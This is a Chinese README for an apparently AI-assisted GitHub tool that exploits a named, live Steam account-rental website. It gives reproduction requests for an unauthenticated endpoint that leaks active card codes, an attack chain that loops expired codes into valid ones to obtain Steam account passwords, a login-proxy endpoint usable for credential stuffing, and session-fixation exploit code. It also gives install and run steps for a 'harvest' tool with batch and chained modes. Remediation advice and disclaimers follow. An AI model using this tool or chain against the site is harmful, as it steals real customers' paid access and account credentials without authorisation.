# Steam租号系统安全漏洞研究

> **免责声明**  
> 本项目仅供安全研究和学习交流使用，严禁用于任何非法用途。  
> 使用本工具进行未经授权的测试可能违反相关法律法规，使用者需自行承担法律责任。  
> 本项目由 AI 辅助生成，仅作为安全研究示例。

---

## 项目概述

本项目针对 Steam 租号平台 `zuhao.steamwukong.com` 进行安全研究，发现多个安全漏洞，包括信息泄露、无认证接口、会话管理缺陷等。

### 研究对象

| 项目 | 详情 |
|------|------|
| 目标平台 | `zuhao.steamwukong.com` |
| 平台类型 | Steam 游戏账号租赁系统 |
| 技术栈 | PHP + nginx + 阿里云 WAF |
| ICP备案 | 鲁ICP备2026004801号 |
| 研究时间 | 2026年7月 |
| 研究方法 | OWASP WSTG 渗透测试方法论 |

---

## 漏洞分析

### 1. 核心漏洞：check_account_occupied.php 信息泄露

**严重程度**: Critical  
**漏洞类型**: CWE-200 (信息泄露) + CWE-639 (IDOR)  
**CVSS评分**: 8.5

#### 漏洞描述

`check_account_occupied.php` 接口在查询已被占用的 Steam 账号时，会返回当前绑定的完整卡密信息，且无需任何认证。

#### 漏洞复现

请求:
```bash
GET /api/check_account_occupied.php?account=REDACTED_ACCOUNT HTTP/1.1
Host: zuhao.steamwukong.com
```

响应:
```json
{
  "success": true,
  "account": "REDACTED_ACCOUNT",
  "occupied": true,
  "end_time": "2026-07-05 20:38:18",
  "detail": {
    "occupation": {
      "id": 63523,
      "card_code": "REDACTED_CARD",
      "start_time": "2026-07-04 20:38:18",
      "end_time": "2026-07-05 20:38:18"
    },
    "rental": {
      "id": 94300,
      "card_code": "REDACTED_CARD",
      "used_at": "2026-07-04 20:38:18",
      "expires_at": "2026-07-05 20:38:18"
    }
  }
}
```

#### 攻击链

```
[过期卡密] --POST--> /api/redeem_card.php
    |
    | 响应: {"expired": true, "last_account": "REDACTED"}
    v
[泄露账号] --GET--> /api/check_account_occupied.php
    |
    | 响应: {"detail": {"occupation": {"card_code": "REDACTED"}}}
    v
[有效卡密] --POST--> /api/redeem_card.php
    |
    | 响应: {"account": "...", "password": "...", "game": "..."}
    v
[账号密码+游戏信息]
```

#### 影响范围

- 只要知道一个过期卡密，就能无限循环获取新的有效卡密
- 可获取 Steam 账号密码和游戏信息
- 无需任何认证即可利用

---

### 2. 无认证 Steam 登录代理：add_friend.php

**严重程度**: Critical  
**漏洞类型**: CWE-306 (缺少关键功能的认证)  
**CVSS评分**: 8.0

#### 漏洞描述

`add_friend.php` 接口接受任意 Steam 账号密码，无需卡密验证，可作为自动化登录代理。

#### 漏洞复现

请求:
```bash
POST /api/add_friend.php HTTP/1.1
Host: zuhao.steamwukong.com
Content-Type: application/json

{
  "username": "任意steam账号",
  "password": "任意密码",
  "friend_code": "76561198000000000",
  "headless": true
}
```

响应:
```json
{
  "max_concurrent": 1,
  "message": "任务已加入队列（单线程顺序处理）",
  "queue_position": 41,
  "running_tasks": 1,
  "success": true,
  "task_id": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
}
```

#### 安全问题

- 不需要卡密、不需要登录、没有验证码
- 可用于凭证填充攻击
- 可消耗服务器资源（队列堆积）
- 后端使用 Puppeteer 自动化登录

---

### 3. Session Fixation 漏洞

**严重程度**: High  
**漏洞类型**: CWE-384 (Session Fixation)  
**CVSS评分**: 7.5

#### 漏洞描述

管理后台 `/admin/` 接受攻击者控制的 session ID，允许 session 固定攻击。

#### 漏洞复现

```python
import requests

s = requests.Session()
s.cookies.set('PHPSESSID', 'attacker_controlled_id', domain='zuhao.steamwukong.com')
r = s.get('https://zuhao.steamwukong.com/admin/', timeout=10)

# 服务器接受了攻击者的 session ID
print(s.cookies.get('PHPSESSID'))  # 输出: attacker_controlled_id
```

#### 攻击场景

1. 攻击者预设 session ID
2. 诱导管理员点击恶意链接
3. 管理员登录后，攻击者使用相同的 session ID 劫持会话

---

### 4. 其他漏洞

| ID | 漏洞 | 严重程度 | CVSS | 位置 |
|----|------|----------|------|------|
| WEB-001 | CSRF 保护缺失 | Medium | 5.0 | /admin/ POST |
| WEB-002 | 暴力破解防护缺失 | Medium | 5.0 | /admin/ POST |
| WEB-003 | 弱验证码（数学题） | Low | 3.0 | /admin/ |
| WEB-004 | Cookie 安全属性缺失 | Medium | 5.0 | PHPSESSID |
| WEB-005 | 安全头缺失 | Low | 3.0 | 全站 |
| WEB-006 | 弱密码策略 | Medium | 5.0 | /admin/ POST |
| WEB-007 | 服务器路径泄露 | Medium | 5.0 | /api/test.php |
| WEB-008 | CORS 配置过宽 | Medium | 5.0 | 全部接口 |

---

## 工具使用

### 安装

```bash
git clone https://github.com/ADWMC/wukong-harvest.git
cd wukong-harvest
pip install requests
```

### 运行

```bash
python wukong_harvest.py
```

### 功能菜单

```
[1] 单个卡密收割
[2] 批量卡密收割
[3] 链式深度收割
[4] 仅查询账号占用（不兑换）
[5] 通过账号反查卡密
[6] 查看历史结果
[0] 退出
```

### 使用示例

单个卡密收割:
```
输入过期卡密: AAAA1234
[+] 泄露账号: xxxxxxxxxxxx
[+] 泄露卡密: BBBB5678  到期: 2026-07-05 20:38:18
[+] 兑换成功!
    账号: xxxxxxxxxxxx
    游戏: 示例游戏 (0000000)
```

---

## API 接口分析

### 已发现接口

| 接口 | 方法 | 功能 | 安全问题 |
|------|------|------|----------|
| /api/redeem_card.php | POST | 兑换卡密 | 过期卡密泄露账号 |
| /api/check_account_occupied.php | GET | 查询账号占用 | 泄露完整卡密 |
| /api/get_verification_code.php | GET | 获取验证码 | 限频 30秒 |
| /api/check_rental.php | GET | 查询续租状态 | 无 |
| /api/change_account.php | POST | 换号 | 需卡密验证 |
| /api/add_friend.php | POST | 添加好友 | 无认证 |
| /api/get_task_status.php | GET | 查询任务状态 | 泄露队列信息 |
| /api/test.php | GET | 测试接口 | 泄露服务器路径 |
| /api/config.php | GET | 配置接口 | 空响应 |

### 卡密格式

```
格式: [A-Z]{4}[0-9]{4}
示例: AAAA1234, BBBB5678
字符集: 大写字母 + 数字
长度: 8位
空间: 26^4 x 10^4 = 4,569,760,000
```

---

## 技术细节

### 服务器信息

```
Server: ESA (阿里云 WAF)
后端: PHP
前端: 单页 HTML + Tailwind CSS 3.4.17
CDN: 阿里云 CDN
SSL: Let's Encrypt
```

### 安全措施（已部署）

- SQL 注入防护（参数化查询）
- XSS 防护（输入过滤）
- 文件包含防护
- 目录遍历防护（nginx）
- 验证码限频（30秒）
- HSTS 启用

### 安全措施（缺失）

- API 认证
- CSRF 保护
- 账户锁定
- 速率限制
- 安全响应头
- 强密码策略

---

## 漏洞修复建议

### 高优先级

1. 移除敏感信息

   ```php
   // 修改前
   "card_code" => $occupation->card_code,
   
   // 修改后 - 删除 card_code 字段，只返回 occupied 状态
   ```

2. 添加 API 认证

   ```php
   $token = $_SERVER['HTTP_AUTHORIZATION'] ?? '';
   if (!validate_token($token)) {
       http_response_code(401);
       exit(json_encode(['error' => 'Unauthorized']));
   }
   ```

3. 修复 Session Fixation

   ```php
   // 登录成功后重新生成 session ID
   session_regenerate_id(true);
   ```

### 中优先级

4. 添加 CSRF 保护
5. 实施速率限制
6. 设置 Cookie 安全属性
7. 添加安全响应头

### 低优先级

8. 使用更强的验证码
9. 实施强密码策略

---

## 参考资料

- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [CWE-200: Exposure of Sensitive Information](https://cwe.mitre.org/data/definitions/200.html)
- [CWE-384: Session Fixation](https://cwe.mitre.org/data/definitions/384.html)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)

---

## 致网站作者

如果你是 `zuhao.steamwukong.com` 的开发者或管理员：

本仓库记录了你网站上存在的安全漏洞，请尽快修复。我们没有利用这些漏洞获取任何利益，也没有泄露任何用户数据，仅做了技术验证。

### 你需要立即修复的问题

1. check_account_occupied.php 泄露卡密 -- 这是最严重的漏洞，任何人只要知道一个账号名就能获取当前绑定的完整卡密。请删除返回数据中的 card_code 字段，只返回 occupied: true/false。

2. add_friend.php 无认证 -- 任何人都可以提交任意 Steam 账号密码到你的服务器执行自动化登录。请添加卡密验证或 API Token 认证。

3. /admin/ Session Fixation -- 管理后台接受攻击者预设的 session ID。请在登录成功后调用 session_regenerate_id(true)。

4. /api/test.php 路径泄露 -- 暴露了服务器绝对路径。请删除或限制访问此文件。

### 联系方式

如果你需要更详细的漏洞细节或修复建议，可以通过以下方式联系：
- 在本仓库提 Issue
- 通过 GitHub 联系仓库作者: [@ADWMC](https://github.com/ADWMC)

### ICP备案信息

- 备案号：鲁ICP备2026004801号
- 域名：steamwukong.com

---

## 许可证

MIT License - 仅供学习和研究使用

---

## 免责条款

本软件按"原样"提供，作者不对使用本软件造成的任何损害承担责任。

使用者应确保其行为符合当地法律法规，包括但不限于：
- 中华人民共和国网络安全法
- 中华人民共和国刑法
- 计算机信息网络国际联网安全保护管理办法

使用本软件进行未经授权的测试可能构成违法行为，使用者需自行承担法律责任。

---

AI Generated - 本项目由 AI 辅助生成，仅供安全研究和学习交流使用。
